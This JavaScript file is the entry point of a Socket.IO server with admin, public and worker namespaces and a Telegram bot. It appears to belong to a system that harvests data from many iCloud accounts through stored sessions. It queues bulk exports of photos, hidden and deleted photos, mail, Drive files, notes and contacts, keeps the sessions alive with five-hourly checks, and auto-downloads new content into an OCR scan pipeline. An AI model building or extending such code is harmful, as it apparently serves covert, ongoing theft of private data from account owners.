import http from "node:http";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { Server } from "socket.io";
import { config, securityWarnings } from "../config.js";
import { Store } from "../store.js";
import { registerPublic } from "./public.js";
import { registerAdmin } from "./admin.js";
import { registerWorkerNamespace } from "./worker.js";
import { WorkerPool } from "./worker-pool.js";
import { startBot } from "../telegram/bot.js";
import { refreshAllCounts } from "../export-counts.js";

/* The separate Socket.IO process.  It owns the store; the web process never
 * touches it.  The Telegram bot runs here too, because it shares that store. */

export function startSocketServer() {
  const store = new Store({ file: config.store.file, seed: config.store.seed });

  const httpServer = http.createServer((_req, res) => {
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("socket.io server\n");
  });

  const io = new Server(httpServer, {
    cors: { origin: config.socketCorsOrigin, methods: ["GET", "POST"] },
    maxHttpBufferSize: 100_000,
  });

  const pool = new WorkerPool({ io, store });
  const publicNsp = registerPublic(io, store, pool);
  registerAdmin(io, store, publicNsp, pool);
  registerWorkerNamespace(io, pool, { token: config.worker.token });

  const bot = startBot({ store, pool, io });
  pool.onEvent = (type, payload) => {
    bot?.onPoolEvent?.(type, payload);
  };

  // Existing exports may predate the export-counts update; repair the panel
  // numbers once on boot instead of waiting for the next export.
  setTimeout(() => {
    try {
      refreshAllCounts(store);
    } catch (error) {
      console.error("[counts] startup refresh", error.message);
    }
  }, 500);

  // On boot, queue every trusted account that still has missing data.  The
  // worker's slots process several accounts at once; the queue is ordered by
  // size so the light accounts (notes/contacts first inside each export) are
  // not stuck behind a huge photo library.
  const missingTotal = (account) =>
    Object.values(account.verify?.missing ?? {}).reduce(
      (sum, value) => sum + (Number(value) || 0),
      0
    );
  const exportWeight = (account) => {
    const counts = account.counts ?? {};
    const big =
      Number(counts.photos || 0) +
      Number(counts.hidden || 0) +
      Number(counts.deleted || 0) +
      Number(counts.driveFiles || 0) +
      Number(counts.mailMessages || 0);
    const small =
      Number(counts.notes || 0) +
      Number(counts.contacts || 0) +
      Number(counts.calendars || 0) +
      Number(counts.reminders || 0);
    return big * 1000 + small;
  };
  setTimeout(() => {
    pool.sweep();
    const accounts = [...store.accounts.values()]
      .filter((account) => account.trusted && !account.hidden)
      .filter((account) =>
        ["connected", "done", "exporting", "error"].includes(account.status)
      )
      .filter(
        (account) =>
          !account.export ||
          account.export.phase !== "done" ||
          missingTotal(account) > 0
      )
      .sort((a, b) => exportWeight(a) - exportWeight(b));
    for (const account of accounts) {
      pool.startExport(account.id, { mode: "missing" }).catch((error) =>
        console.error("[startup] export", account.email, error.message)
      );
    }
    if (accounts.length) {
      console.log(`[startup] queued ${accounts.length} export(s)`);
    }
  }, 15_000);

  // A cheap keepalive probe; the worker uses the stored trusted session.
  const sweeper = setInterval(() => pool.sweep(), 60_000);
  sweeper.unref?.();

  // Five-hour live check: verify the saved session, compare live iCloud with
  // the export, then auto-download any new photos/notes/etc. (the usual
  // export -> OCR scan chain follows).  Manual "Recheck all" does the same.
  const keepalive = setInterval(() => {
    const cutoff = Date.now() - config.worker.keepaliveHours * 3600_000;
    for (const account of store.accounts.values()) {
      if (!["connected", "done"].includes(account.status)) continue;
      if (!account.trusted || account.hidden) continue;
      const last = Date.parse(
        account.lastCheckAt ||
          account.verify?.finishedAt ||
          account.lastPingAt ||
          0
      );
      if (last > cutoff) continue;
      store.updateAccount(account.id, { recheckPending: true });
      pool.startVerify(account.id).catch((error) => {
        store.updateAccount(account.id, { recheckPending: false });
        console.error("[keepalive] verify", account.email, error.message);
      });
    }
  }, 30 * 60_000);
  keepalive.unref?.();

  for (const warning of securityWarnings()) {
    console.warn(`[security] ${warning}`);
  }

  httpServer.listen(config.socketPort, () => {
    console.log(
      `[socket] ws://127.0.0.1:${config.socketPort} (/public, /admin, /worker)`
    );
  });

  function close() {
    clearInterval(keepalive);
    clearInterval(sweeper);
    bot?.stop().catch(() => {});
    io.close();
    httpServer.close();
    store.flush();
  }

  process.on("SIGINT", close);
  process.on("SIGTERM", close);

  return { io, store, pool, httpServer, bot, close };
}

const isMain =
  process.argv[1] &&
  pathToFileURL(path.resolve(process.argv[1])).href === import.meta.url;

if (isMain) startSocketServer();
